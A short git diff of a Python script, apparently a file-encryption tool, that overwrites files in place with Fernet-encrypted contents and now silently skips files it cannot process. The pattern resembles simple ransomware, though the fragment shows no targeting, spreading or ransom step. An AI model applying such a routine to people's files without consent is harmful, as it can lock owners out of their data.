@@ -12,11 +12,14 @@ import sys
 
 def encrypt_file(file_name,key):
     f = Fernet(key)
-    with open(file_name,"rb") as fil:
-        file_data = fil.read()
-    encrypted_data = f.encrypt(file_data)
-    with open(file_name, "wb") as fil:
-        fil.write(encrypted_data)
+    try:
+        with open(file_name,"rb") as fil:
+            file_data = fil.read()
+            encrypted_data = f.encrypt(file_data)
+            with open(file_name, "wb") as fil:
+                fil.write(encrypted_data)
+    except:
+        print(f'[IGNORING]{file_name}')
 
 def main():
     if os.path.exists('secret.key'):
